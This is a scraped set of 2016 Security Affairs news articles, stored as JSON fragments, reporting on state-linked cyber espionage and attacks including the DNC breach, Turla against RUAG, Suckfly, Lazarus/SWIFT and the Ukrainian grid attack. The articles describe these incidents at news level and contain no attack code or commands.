cyber defence is considerable a must after the Warsaw summit, many experts are questioning about offensive cyber capabilities of Alliance. Almost every state is working to improve its offensive cyber capabilities too. I believe that it is crucial to understand how the member states and the entire alliance intends to operate on the offensive front. Will the NATO improve cyber offensive capabilities too? How?\n\nAnother aspect to consider is the response of non-NATO states to approach chosen by the Alliance on the cyber security matter.\n\nSome experts speculate that a similar decision could speed up the militarization of the cyberspace, for sure it will raise the debate on Information Warfare and the need of a new legal framework to address these questions.\n\nPierluigi Paganini\n\n(Security Affairs \u2013NATO, Warsaw Summit)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warsaw-summit", "topic_name": "Warsaw Summit"}]}, {"news_name": "Facebook malware infected more than 10,000 users in two days", "news_link": "https://securityaffairs.co/wordpress/48948/malware/facebook-malware-phishing.html", "title": "Facebook malware infected more than 10,000 users in two days\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 2, 2016", "body": "Security experts from Kaspersky monitored a phishing campaign that hit Israeli media since June 26th.\n\n\n\nThousands of Facebook users reported that they had been infected by a malware spread through the Facebook platform after they received a message from a friend claiming they had mentioned them in a comment.\n\n\u201cOn the morning of 26th June, news of a phishing campaign hit the Israeli media.

The researchers noticed many similarities with a 2015 spearphishing campaign that targeted more than 1,800 Google Accounts.\n\n\n\n\u201cThe threat group used the Bitly URL-shortening service to hide the location of a spoofed Google login page. Many of the accounts in the 2015 campaign belonged to individuals in Russia and the former Soviet states, but some belonged to current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists, particularly those with an interest in Russia.\u201d states the report published by the SecureWorks.\n\nThe experts believe that the Pawn Storm APT group was gathering intelligence from military personnel, authors and journalists, NGOs, and individuals involved in government and defense sectors and political activists.\n\nMost of the victims of this last campaign where people from the United States and NATO member countries.\n\nCTU researchers analyzed 4,396 phishing URLs sent to 1,881 Google Accounts between March and September 2015.

According to the report, the attacks started declining in mid-2014 and has continued.  According to FireEye, the decline in activity can be attributed to several factors such as the Just Department\u2019s indictment of several PLA officers believed to have been involved in several high-profile attacks against US military interests as well as Preside Barrack Obama\u2019s insistence that China stops its espionage program against the US or suffer economic sanctions. Despite FireEye\u2019s findings, many remain skeptical.\n\nAccording to iSight Partners, the decline in Chinese attacks against the US actually had been declining nearly a year before Chinese President Xi and Obama agreed to a cyber cease fire.  In iSight\u2019s analysis concluded that the decline in attacks has more to do with Xi\u2019s crack down in 2012 of hackers profiting from their attacks.  Xi has made a crackdown on government and military corruption for financial gain and centerpiece of his domestic policies.  It is likely that this crackdown has extended to PLA units and their military handlers as China\u2019s espionage program matures and better managed.\n\nPerhaps more intriguing than the decline in Chinese cyber-spying against the US is FireEye\u2019s conclusion that attacks that are occurring are made with more precision.  This may lend support to Xi\u2019s overall objective of rooting out corruption is working.   Although it can\u2019t be said for sure, it is likely that new PLA tactics are becoming harder to detect as the PLA hardens its abilities and institutes better tradecraft to hide is activities.  Even FireEye admits that the level of sophistication and selective targeting by China is now the new normal.  There are also other factors to consider.\n\nIt has long been believed that China has an unlimited supply of Chinese hackers.  I myself know that the black hat community in China is very robust, with black hat hacking groups gathering several times a year to share their techniques, tactics, and protocols in and around China\u2019s technology centers.  Regardless, there are limitations to the number of attacks that can be carried out by the attackers if the PLA is being more selective in its targeting.  It is likely that PLA, or other handlers of non-government black hats, are tightening up its activities as to not draw the attention of President Xi.\n\n\n\nThe theories for the decline are almost as endless as malware variants but perhaps the most likely scenario is less about President\u2019s Xi\u2019s domestic policies and more about his geopolitical ambitions.  In recent years, China has expanded its economic reach globally with a strong focus on South and Central Asia; more specifically, China\u2019s \u201cOne Belt, One Road\u201d initiative.\n\nThe goal behind the initiative is to provide trade routes from as far west as Iran and east to Indonesia.  These trade routes that include land and sea transit routes for energy and goods pass through some of the world\u2019s least stable countries.  Pakistan and Afghanistan are two good examples, political instability and terrorism are significant risks to China\u2019s goals.  Terrorist groups such as the Taliban are heavily entrenched in some of these areas. There are also tribal disputes and other Islamic militants to consider.   For this, it is likely that China has shifted its attention from what it feels comfortable knowing, the US, to what it doesn\u2019t.\n\nCyber targeting Kazakhstan, India, and Vietnam may represent far more important sources of information to execute Xi\u2019s long-term ambitions at this moment than the next US military weapon system.  If this is true, it may signal Beijing\u2019s desire to take on the US economically rather than militarily.\n\nChina\u2019s espionage program has often been seen using the least amount of force to compromise its target often exploiting the weakest vulnerabilities first, such as Windows XP, or other unpatched systems, then escalating up.  It is likely that the infrastructures in developing countries such as Afghanistan and others along the One Belt, One Road trade routes have weak infrastructures that require little skills to penetrate.  It would only make sense that China would use its most sophisticated hacks and hackers for high value targets in the US, shifting a majority of its less experienced hackers on unhardened systems that are easily compromised.\n\nWritten by: Rick Gamache\n\nRick Gamache is a freelance writer with 25 years\u2019 experience in the cyber security field.

According to the US-based cyber security company CrowdStrike, two sophisticated Russian espionage groups, COZY BEAR and FANCY BEAR were behind the attacks basing that conclusion on specific techniques, tactics, and protocols (TTPs) uncovered during the company\u2019s investigation of the breach \u2013 a lot can change in twenty-four hours!\n\nShortly after that blog was filed, a hacker going by the persona Guccifer 2.0, claimed responsibility for the DNC breach.  Guccifer 2.0 is a play on a Romanian hacker calling himself Guccifer.  Guccifer is believed to be the man behind hacking into Hillary Clinton\u2019s personal email server, compromising thousands of sensitive US State Department documents,\n\n\n\nGuffifer 2.0 \u2019s blog questions CrowdStrike\u2019s conclusion that those behind the DNC attacks were sophisticated stating, \u201cI\u2019m very pleased the company appreciated my skills so highly))) But in fact, it was easy, very easy.\u201d  That\u2019s not all.  To prove his point, Guccifer 2.0 released several sensitive DNC documents including donor lists, strategy lists, and even a document titled \u201cNATIONAL SECURITY TRANSITION PLANNING\u201d detailing a timeline of activities of transitioning Secretary Hilary Clinton into the role of President after the November election.\n\nThis twist of events has called into question once again the value of attribution and it accuracy.  As a threat intelligence analyst myself, the difficulty in pinpointing attribution to a particular individual, group, or even nation is very difficult and not without its critics.  Security research Bruce Schneier accurately captured the attribution problem in his blog writing:\n\nAnd while it now seems that North Korea did indeed attack Sony, the attack it most resembles was conducted by members of the hacker group Anonymous against a company called HBGary Federal in 2011. In the same year, other members of Anonymous threatened NATO, and in 2014, still others announced that they were going to attack ISIS. Regardless of what you think of the group\u2019s capabilities, it\u2019s a new world when a bunch of hackers can threaten an international military alliance.\n\nAnd it\u2019s an important point.  At the geostrategic perspective, proper attribution of these types of attacks is critical, especially if the US election system appears to be a victim.\n\nWhether or not the DNC beach will damage the campaigns of the presidential hopefuls is yet to be seen, but that isn\u2019t necessarily the most important thing to consider.  At stake is the election, arguably, of the most powerful person in the world. In a country that values its democracy so highly, any view that the election process has been compromised may have a serious impact on the public\u2019s perception of the President elect\u2019s legitimacy.  Not only is attribution hard, it\u2019s also vital for decision makers.\n\nJust because attribution is hard, doesn\u2019t mean we shouldn\u2019t do it \u2013 even if we, as researchers get it wrong at times.  I personally have seen the value of attribution not just at the nation-state level but on a much smaller scale, where the motivations of the hacker were less about global ambitions and more about financial gain.  Watching cyber intelligence people in the private sector struggling with resources are far more empowered when making their arguments about funding their efforts when they turn the conversation from \u201cHow?\u201d to \u201cWho?\u201d  Amazing how quickly you grab a penny-pinching COO\u2019s attention when you have pictures of hackers who just ran amok through you ERP system!\n\nSo has Guccifer 2.0 really called into question CrowdStrike\u2019s conclusions? \n\nAbsolutely not!  They\u2019re an excellent threat intelligence shop and I\u2019m confident they\u2019ve done their homework.  International espionage is a tricky game and a good defense is a good diversion.  So is Guccifer 2.0 actually a Russian espionage threat actor?  We don\u2019t know, and may never know, but clearly Guccifer 2.0, whoever he is, he has access to leaked DNC documents, but for further proof is needed before I\u2019m a disciple.  It would have been a lot more believable if Guccifer 2.0 had walked through the attack in a YouTube video. Even then, you\u2019d still have people disbelieving his claims.\n\nIn the end, we\u2019re all left to draw your own conclusions, but keep in mind that disinformation is a powerful asset.

According to the Seoul police, the security breach was discovered earlier this year, the attackers launched the attack from at least 16 servers based in Pyongyang.\n\nThe Police confirmed that some of the servers used in the attack had the same IP addresses as those that were involved in attacks spotted in 2013 against Seoul\u2019s banks and TV broadcasters in 2013.\n\nThe authorities of the South Korea confirmed that North Korean hackers breached entities in the South after they successfully compromised in 2014 a computer management software developed by a Seoul IT firm.\n\n\n\nAccording to a South Korean military official, the stolen data wasn\u2019t sensitive information, its theft will have no severe impact on the Korean industry.\n\n\u201cThe leak will likely have a negligible impact on national security,\u201d the official said.\n\nThe attack appears to be a large-scale offensive that requested a significant effort of the attackers\u2019 perspective that used at least 33 different strains of malware to infect the targeted system and gain their complete control.\n\n\u201cNorth Korea turns out to have been preparing for a long time to try to launch a countrywide cyberattack,\u201d states the announcement issued by the authorities.\n\n\u201cThe police said that by detecting the breach they prevented what appeared to be the start of a large-scale cyberattack.

They get the API names and used it in the Yara signature, then they analyzed the code used in the attacks and discovered a small portion of code where a file name consisting of randomly generated lowercase letters is created, so they used also this string as part of the Yara search criteria.\n\n\u201cUsing this criteria, we began a search of a large malware database starting on Thursday night. On Friday morning, we thought we\u2019d be faced with a sea of false positives. But it only returned 10 matches! Four of those were known samples of the SWIFT malware, and one sample was a zip file that includes a known SWIFT sample. The other five samples are detailed above.\u201d\n\nSummarizing, SWIFT hackers have recycled malware code used in past attacks, including the Sony Hack, and evidence suggest the involvement of the Lazarus group\n\nIf you appreciate my effort in spreading cyber security awareness, please vote for Security Affairs as best European Security Blog.

The cyber attack was announced by the Swiss defense minister Guy Parmelin that explained that the Federal Department of Defence, Civil Protection and Sports was targeted by hackers.\n\nIt was not possible to attribute the attack, anyway, experts have found many similarities with another cyber attack that hit the government-owned Ruag firm.\n\nThe Ruag firm is a technology company, based in Bern, that supplies the country\u2019s military with munitions. Threat actors exfiltrated data from the systems of the firm, which is wholly owned by the Swiss government, though the extent of the theft was unknown.\n\nBelow a portion of the interview released by Parmelin to the Swiss daily Tages-Anzeiger.\n\n\u201cAccording Tagesanzeiger.ch/Newsnet-Informationen hang the attacks against the VBS with a major cyber attack on the defense group RUAG together, behind Russia is suspected. Is become active in this matter, the Federal Council?\nThe Federal Council has been informed. He has proposed several measures that are now being implemented. The Attorney General has instituted a process.\n\nWhat were these attacks?\nThe attacks were of industrial espionage. Because Ruag working for the army and the federal government and 100 percent of the federal government is one, it is very important for us to minimize risks.\u201d\n\nParmelin pointed out industrial espionage has the root cause of the cyber attack and said his department was able to mitigate the attack and restore normal operations.\n\nNow the Reporting and Analysis Center for Information Assurance (MELANI) has published a detailed Technical Report about the Malware used in the Cyberespionage against RUAG.\n\nOnce the attackers found an entry point in the target network, they moved laterally compromising other devices in the architecture, this was possible by targeting directly the active directory.\n\nThe malicious code contacted its C&C servers through HTTP requests, it received from them commands and also new malicious payloads to execute. The experts noticed that only some of the infected machines directly contacted the C&C servers, instead, they received instructions and communicated through named pipes.\u201cThe malware sent HTTP requests to transfer the data to the outside, where several layers of Commandand-Control (C&C) servers were located. These C&C servers provided new tasks to the infected devices. Such tasks may consist of new binaries, configuration files, or batch jobs. Inside the infiltrated network, the attackers used named pipes for the internal communication between infected devices, which is difficult to detect.\u201d states the report published by Melani. \u201cThis way, they constructed a hierarchical peer-to-peer network: some of these devices took the role of a communication drone, while others acted as worker drones\u201d\n\nThe experts from Melani distinguish the following phases of the attack:\n\nVictim evaluation: During this phase, the attacker tries to get as much information about the target as possible. It is a preparation for the actual attack and covers at least the IP ranges, platforms and some usage patterns of their users. It is important for him to place the right waterholes and to be able to filter out unwanted victims from the actual targets. This phase is divided into several sub phases, not all need to be necessarily be in place: \u2022 Passive information gathering \u2022 Active scanning \u2022 Preparing waterholes \n\nInfecting: The infection phase consists of a fingerprint of the victim in order to find the best suited infection method (using an appropriate exploit or a social engineering technique). It has the following sub phases: \u2022 Activating waterholes / sending spearphishings \u2022 Fingerprinting: This is most often done using JavaScript \u2022 Exploiting: Depending on the target, a suitable exploit is chosen. If this is not feasible, a social engineering approach is applied. \n\nActive Infection: The attacker is now in the network. There are several sub phases here: \u2022 Trojan supported Reconnaissance: We often see an initial reconnaissance tool being placed, performing additional reconnaissance actions from within the network of the victim. This tool has not many capabilities, but can be replaced by a more powerful malware at any time. \u2022 Gaining Persistence: If the recon tool has been placed successfully and has sent out enough information, it is replaced by the actual malware with more functionality and deeper persistence in the system and the network. \u2022 Lateral Movement: The attacker begins to move laterally in order to gain access to the information he is interested in. Lateral movement is often done by using \u201cnormal\u201d tools that are also used for managing systems. The lateral movement also comprises the collection of credentials, as well as the elevation of privileges. \u2022 Data Exfiltration: As soon as the attacker begins to steal data, he must transport it outside of the network without being discovered. This is often done by first compressing the data and then sending it out, piece by piece.\n\nThe experts confirmed that it is quite difficult to estimate the damage caused by the hacking attack. The analysis of the proxy logs revealed periods of intense activities in alternate with very few activity.The report published by Melani also includes recommendations and countermeasures to defeat this Turla variant and promptly identify the presence of attackers, the authors also invite victims to share information about the attack.\n\n\n\nWho is behind Turla?\n\nIt is very hard to discover the real identity of the attackers, the report itself did not make speculation on the alleged culprits.\n\nGoing back in March 2014 the researchers at BAE Systems Applied Intelligence spotted a Russian cyber espionage campaign codenamed as SNAKE that targeted Governments and Military Networks.\n\nThe attackers behind the operation SNAKE penetrated highly secured systems all around the world, but most interesting revelation is that the Uroburos rootkit recently discovered by German security firm G Data Software was just one component of the overall SNAKE campaign.\n\nFor the SNAKE campaign the attackers used various pieces of malware, Western intelligence officers have found another spyware, dubbed Turla, used to infect government network all over the world.\n\nResearchers linked the malware Turla to popular cyber espionage campaign Red October discovered by Kaspersky in 2013 that hit government, military and diplomatic organizations all around the world.\n\nFollowing this chain of events and the discoveries made by various security firms we can speculate that behind the Turla malware there are Russian nation-state hackers.\n\nHowever, we cannot be sure that Russian hackers have now targeted the Ruag firm too.\n\nI suggest you to give a look to the report, it is full of interesting data.\n\nIf you appreciate my effort in spreading cyber security awareness, please vote for Security Affairs as best European Security Blog.

Later the group launched long-term espionage campaigns against organizations across the world, most of them located in India.\n\n\u201cIn March 2016, Symantec published a blog on Suckfly, an advanced cyberespionage group that conducted attacks against a number of South Korean organizations to steal digital certificates. Since then we have identified a number of attacks over a two-year period, beginning in April 2014, which we attribute to Suckfly. The attacks targeted high-profile targets, including government and commercial organizations.\u201d states a blog post published by Symantec. \u201cThese attacks occurred in several different countries, but our investigation revealed that the primary targets were individuals and organizations primarily located in India.\u201d\n\nThe principal weapon in the arsenal of the Suckfly group is the a backdoor called Nidiran that leverage Windows known vulnerabilities to compromise the targets and move laterally within the corporate network.\n\nThe experts noticed that the group spent a significant effort to compromise an Indian government department that installs network software for other ministries and departments.\n\nSymantec analyzed the tactics, techniques, and procedures (TTPs) of the hacker group profiling the modus operandi of the attackers. The hackers use to identify employees in the target organization trying to compromise their systems, likely through a spear-phishing attack.\n\nOnce inside the target network, the hackers search for other targets to compromise by using hacking tools to move laterally and escalate privileges.\n\n\n\n \n\nThe nature of the targets, the TTPs of the Suckfly group and the working days in which the group is active (The group operates from Monday to Friday) led the experts into believing that it is a nation-state actor.\n\n\u201cThese steps were taken over a 13-day period, but only on specific days. While tracking what days of the week Suckfly used its hacktools, we discovered that the group was only active Monday through Friday. There was no activity from the group on weekends. We were able to determine this because the attackers\u2019 hacktools are command line driven and can provide insight into when the operators are behind keyboards actively working. Figure 4 shows the attackers\u2019 activity levels throughout the week. This activity supports our theory, mentioned in the previous Suckfly blog, that this is a professional organized group.\u201d states Symantec.\n\nWho is behind the Suckfly group?\n\nIt is hard to link the Suckfly group to a specific Government, Symantec highlighted that its targets have been India, South Korea, Saudi Arabia, and India.\n\nGiving a look to the C&C infrastructure used by the group, we can notice that several domains were registered by users with the addresses of the Russian email service provider Yandex. Of course, this information alone gives us no added value for the attribution, the unique certainly is that the hackers will continue their campaign in the next months.\n\n\u201cThe nature of the Suckfly attacks suggests that it is unlikely that the threat group orchestrated these attacks on their own. We believe that Suckfly will continue to target organizations in India and similar organizations in other countries in order to provide economic insight to the organization behind Suckfly\u2019s operations.\u201d states Symantec.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Suckfly group, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/india", "topic_name": "India"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nation-state-actor", "topic_name": "nation-state actor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/suckfly-group", "topic_name": "Suckfly group"}]}, {"news_name": "Malware used in the recent banking cyberheists is linked to Sony Pictures hack", "news_link": "https://securityaffairs.co/wordpress/47320/malware/sony-pictures-malware.html", "title": "Malware used in the recent banking cyberheists is linked to Sony Pictures hack\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 15, 2016", "body": "A second bank was a victim of a malware-based attack, the news was recently confirmed by the SWIFT.

The file-delete function itself is also unique \u2013 the file is first renamed into a temporary file with a random name, and that temporary file is also deleted.\u201d states the analysis published by the experts.\n\n\n\nExtending their analysis to previous malware samples with similar features, the duo has found one wiper component called msoutc.exe.

Windows 10, our most secure operating system ever, is not susceptible to this and many other techniques and attack vectors.\u201d Microsoft wrote in a blog post. \u201cWhat this means in practical terms is that PLATINUM was able to abuse this feature to hide their backdoor from the behavioral sensors of many host security products.

The man, Su Bin (also known as Stephen Su and Stephen Subin), 50, had been charged in a 2014 indictment with hacking into the computer networks of US defense contractors, including the Boing. The hackers aimed to steal blueprints and intellectual property for the F-22 and F-35 fighter jets and C-17 transport aircraft. In January 2015, Edward Snowden revealed China stole designs for the US-built F-35 Fighter jet hacking computer systems at US Defense contractors, and provides details also a counter-intelligence operation run by the NSA.\n\nAccording to Snowden, the US Intelligence was aware that Chinese cyber spies have stolen \u201cmany terabytes of data\u201d about the design of Australia\u2019s Lockheed Martin F-35 Lightning II JSF. The details of the operation are described in a set of top secret documents published by the Der Spiegel magazine.\n\nChinese hackers have allegedly stolen as much as 50 terabytes of data from the US Defense contractors, including the details of the fighter\u2019s radar systems, engine schematics, \u201caft deck heating contour maps,\u201d designs to cool exhaust gasses and the method the jet uses to track targets.\n\nThe purpose of the Chinese Government is to acquire intellectual property on advanced technologies, benefiting Chinese companies on the market and narrowed the gap in the research of advanced technological solution. Military experts speculated that the stolen blueprints  could help the country to develop a new generation of advanced aircraft fighter, so-called \u201cfifth-generation\u201d fighters.\n\nIn 2014, according to a US criminal complaint, computers of Boeing and other military contractors have been hacked to steal intellectual property and trade secrets on transport aircraft. The initial attacks against Boeing likely occurred between Jan 14th and March 20th, 2010. The complaint is dated June 27th and was disclosed on July 2015, it describes how the attackers have spied on Boeing computer networks for a year, and then have compromised systems of the principal US Defense contractors to steal intellectual property. According to the information disclosed, the hackers were mainly interested in the C-17 military transport.\n\nThe US law enforcement agencies accused Su Bin, a Chinese businessman residing in Canada, of supporting two countrymen in the organization of cyber attacks on Boeing systems to collect information about the C-17 and other military programs.\n\n\n\nThe criminal complaint revealed that Su Bin with two unnamed co-conspirators, identified as UC1 and UC2, were collecting technical information related to components and performance of the C-17 transport and Lockheed Martin\u2019s F-22 and F-35 fighter jets. During the period related the first attacks against Boeing, Su Bin was operating in the United States, as confirmed by FBI Special Agent Noel Neeman in the complaint.\n\nSu Bin was arrested on June 2014 month in Canada, Neeman revealed that an email attachment sent by UC1 claims the Chinese hackers exfiltrated 65 gigabytes of data over a couple of years, including information on the C-17 transport from Boeing systems. The FBI agent collected evidence of data theft from Boeing systems, but there is no proof that the data that the stolen information was classified. The email provides also information related to the huge effort spent by hackers to compromise the Boeing system, the document details the architecture of the internal network of Boeing, which includes 18 domains, 10,000 PC and a \u201chuge quantities\u201d of defense appliances.\n\n\u201cThrough painstaking labor and slow groping, we finally discovered C-17 strategic transport aircraft-related materials stored in the secret network,\u201d the document says.\n\nHe was sent to the United States in February 2016.\n\nThe hackers described the difficulties to breach the system avoid detection system deployed by Boeing.\n\n\u201cFrom breaking into its internal network to obtaining intelligence, we repeatedly skipped around in its internal network to make it harder to detect reconnaissance, and we also skipped around at suitable times in countries outside the U.S. In the process of skipping, we were supported by a prodigious quantity of tools, routes and servers, which also ensured the smooth landing of intelligence data.\u201d states the report.\n\nThe complaint did not provide any description on how hackers have stolen information about the Lockheed Martin jet fighters.\n\nAnother document issued by the FBI described the communications between UC1 and UC2, which states that the Chinese hackers successfully acquired information about US military project by establishing hot points in the U.S., France, Japan and Hong Kong. This last document, according to the complaint, reveals that the subjects have received about $1 million to build a team and infrastructure outside of China, the investigators are working to understand who has funded the entire operation.\n\nNow in a plea agreement filed in a California federal court, Su admitted to conspiring with two unnamed persons in China from October 2008 to March 2014 to hack network of US contractors and steal \u201csensitive military information and to export that information illegally from the United States to China.\u201d\n\nThe Court documents did not provide details on who operated the cyber espionage campaign, but security and intelligence experts believe that Su was working for the Chinese Government.\n\n\u201cSu Bin admitted to playing an important role in a conspiracy, originating in China, to illegally access sensitive military data, including data relating to military aircraft that are indispensable in keeping our military personnel safe,\u201d said Assistant Attorney General John Carlin.\n\n\u201cThis plea sends a strong message that stealing from the United States and our companies has a significant cost; we can and will find these criminals and bring them to justice.\u201d\n\nSentencing was set for July 13, when Su faces a maximum penalty of five years in prison and a monetary fine of $250,000 or twice the gross gain from the offense.\n\nThe US government will issue a final ruling on the case on July 13.

On 23 December 2015, Ukraine suffered from an overall power blackout and that caused great distress to the people. Prykarpattyaoblenergo lost more than 30 substations, causing havoc in return.

What does this say about security online?\n\nThe malware used is called \u201cKilldisk\u201d and was the outcome of a well-organized effort to gain control over the computers of the stations. Files appeared to the people working for the power company, attached by their \u201cfriends\u201d \u2013 making it easier for them to open. Instead of files sent by their friends, the malware was installed into the computers and caused all these grave consequences.\n\n\n\nOn the bright side, this must have taken a lot of time and therefore, it is not the main tactic used by hackers in similar cases. However, it is always possible to happen again!\n\nThe bad news is that there are alternative ways for hackers to get inside similar systems, according to Sergey Gordeychik, who helps with Scada Strangelove, the community of experts working on discovering the faults of ICS systems.\n\n\u201cWe can discover more than 80,000 different kinds of ICS systems connected to the internet directly,\u201d Gordeychik told the BBC. \n\nAs a result, the ICS systems do not have the power to defend themselves against an attack.

Ask a group of hackers to test it. This is the concept behind a bounty program, an organization can hire hackers to test the system and ethically disclose the flaw, receiving a reward. Bug bounties are very popular initiatives among the communities of white hats, principal companies, including Facebook, Google and Microsoft. Facebook, for example, has already paid more than $3 million since 2011, when its bug bounty program was launched.\n\nAnd what about if I tell you that the organization in question is the pentagon? Yes, it is true, \u2018Hack the Pentagon\u2019 is the initiative launched by the US Government, the first ever program of its kind, that aims to test the resilience to cyber attacks of the US defenses.\n\nIf the Pentagon will financial reward the hacker, it would be the first government-funded bug bounty initiative in the world.\n\n\u201cThe Pentagon said on Wednesday it would invite vetted outside hackers to test the cybersecurity of some public U.S. Defense Department websites as part of a pilot project next month, in the first-ever such program offered by the federal government.\u201d \n\n\u201cHack the Pentagon\u201d is modeled after similar competitions known as \u201cbug bounties\u201d that are conducted by big U.S. companies, including United Continental Holdings Inc to discover gaps in the security of their networks.\u201d states the Reuters.\n\nAt time I was writing the bounty program has not been announced, until today, the Pentagon already uses its own internal security experts (so-called \u201cred teams\u201d) to test its networks, but openness to external hackers could give a major impetus in finding vulnerabilities in government systems, allowing to find new security holes.\n\nThe Hack the Pentagon initiative is welcome within the US government, in this way the expert at the Pentagon will be able to identify security issues before hackers can exploit them, with a significant improvement in term of cyber security.\n\n\u201cI am confident that this innovative initiative will strengthen our digital defenses and ultimately enhance our national security,\u201d commented the Defense Secretary Ash Carter.\n\nAccording to the Reuters, the participants will have to be US citizens and submit to background checks before being accepted to the Hack the Pentagon program, this is the principal difference with a common bug bounty initiative.\n\nThe program is being led by the DoD Defense Digital Service, which is a small team of engineers and experts, set up in November 2015,  meant to \u201cimprove the Department\u2019s technological agility and solve its most complex IT problems.\u201d\n\nIn October 2015, Current and former members of the department\u2019s cyber wing of the US Army, Captain Michael Weigand and Captain Rock Stevens, published a paper urging a  joint project between the Army Cyber Institute and the US Marine Corps Forces Cyberspace Command. The project aimed to establish a central program for disclosing software vulnerabilities on military systems.\n\nThe military experts highlighted how essential aspects of the software lifecycle, like patch management and penetration testing are very difficult to carry on these environments. The systems used in the US Army are exposed by an absence of centralized patch management and penetration testing are not allowed due to the nature of the systems.\n\nThey call for a radical change, including the introduction of bug bounties, today internal experts who discovered vulnerabilities have no incentive to report the flaw are no obliged to disclose it, the post refers this bad habit as a \u201cdo nothing\u201d culture.\n\n\n\nIn the paper published on the Cyber Defense Review website, the duo proposed the creation of an Army Vulnerability Response Program (AVRP), a bug bounty program run by the US military.\n\nThe Army Vulnerability Response Program (AVRP) platforms proposed by the military expert have to enable service people to report bugs free of risk of retribution and say penetration tests should be promoted as vulnerability scans are inadequate.\n\n\u201cThe AVRP will serve as the central reporting mechanism for vulnerabilities in Army networks and will receive reports on poor configurations or gaps in security that could allow attackers to degrade Army systems.

Security experts speculate the involvement of Russian nation-state actors that have used the BlackEnergy to infect SCADA systems of Ukrainian grid and critical infrastrcuture.\n\nAccording to a Ukrainian media TSN, the power outage was caused by the destructive malware that disconnected electrical substations. The experts speculate that hackers run a spear phishing campaign across the Ukrainian power authorities to spread the BlackEnergy malware leveraging on Microsoft Office documents.\n\nNow a new report published by the DHS Industrial Control Systems Cyber Emergency Response Team confirms that the outage was caused by a cyber attack.\n\nThe report is based on interviews with operations and IT staff at six Ukrainian organizations involved in the attacks. The thesis has been supported first by the SANS industrial control systems team, but it is still unclear the real impact of the BlackEnergy malware of the incident.\n\n\n\nThe SANS report reported that attackers flooded the call centers at the power authorities with phone calls, the intent of the attackers was to prevent customers from reporting the incident to the companies operating the critical infrastructure.\n\nThe DHS report highlights the possibility that the two strains of malware were used by the attackers after the outage in an attempt either to destroy evidence the intrusion or make recovery more difficult.\n\n\u201cFollowing these discussions and interviews, the team assesses that the outages experienced on December 23, 2015, were caused by external cyber-attackers. The team was not able to independently review technical evidence of the cyber-attack; however, a significant number of independent reports from the team\u2019s interviews as well as documentary findings corroborate the events as outlined below.\u201d states the report.\n\n\u201cThrough interviews with impacted entities, the team learned that power outages were caused by remote cyber intrusions at three regional electric power distribution companies (Oblenergos) impacting approximately 225,000 customers.\u201d\n\n\u201cThe cyber-attack was reportedly synchronized and coordinated, probably following extensive reconnaissance of the victim networks. According to company personnel, the cyber-attacks at each company occurred within 30 minutes of each other and impacted multiple central and regional facilities. During the cyber-attacks, malicious remote operation of the breakers was conducted by multiple external humans using either existing remote administration tools at the operating system level or remote industrial control system (ICS) client software via virtual private network (VPN) connections. The companies believe that the actors acquired legitimate credentials prior to the cyber-attack to facilitate remote access.\n\nAll three companies indicated that the actors wiped some systems by executing the KillDisk malware at the conclusion of the cyber-attack. The KillDisk malware erases selected files on target systems and corrupts the master boot record, rendering systems inoperable. It was further reported that in at least one instance, Windows-based human-machine interfaces (HMIs) embedded in remote terminal units were also overwritten with KillDisk. The actors also rendered Serial-to-Ethernet devices at substations inoperable by corrupting their firmware. In addition, the actors reportedly scheduled disconnects for server Uninterruptable Power Supplies (UPS) via the UPS remote management interface. The team assesses that these actions were done in an attempt to interfere with expected restoration efforts.\u201d\n\nThe report confirmed that every company victim of the attack was infected with the BlackEnergy malware, but avoided to provide further details on the role played by the malware.\n\n\u201cEach company also reported that they had been infected with BlackEnergy malware; however, we do not know whether the malware played a role in the cyber-attacks. The malware was reportedly delivered via spear phishing emails with malicious Microsoft Office attachments. It is suspected that BlackEnergy may have been used as an initial access vector to acquire legitimate credentials; however, this information is still being evaluated. It is important to underscore that any remote access Trojan could have been used and none of BlackEnergy\u2019s specific capabilities were reportedly leveraged.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 SCADA , BlackEnergy malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/blackenergy-malware", "topic_name": "BlackEnergy malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ukraine", "topic_name": "Ukraine"}]}, {"news_name": "Wikileaks \u2013 NSA tapped world leaders for US geopolitical Interests", "news_link": "https://securityaffairs.co/wordpress/44816/intelligence/nsa-tapped-world-leaders.html", "title": "Wikileaks \u2013 NSA tapped world leaders for US geopolitical Interests\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 26, 2016", "body": "A couple of days ago the non-profit journalistic organisation WikiLeaks published a collection of highly classified documents that reveals the NSA targeted world leaders for US Geopolitical Interests.\n\nSome of the intercepts are classified TOP-SECRET COMINT-GAMMA, these are most highly classified documents ever published by a media organization.\n\nIn 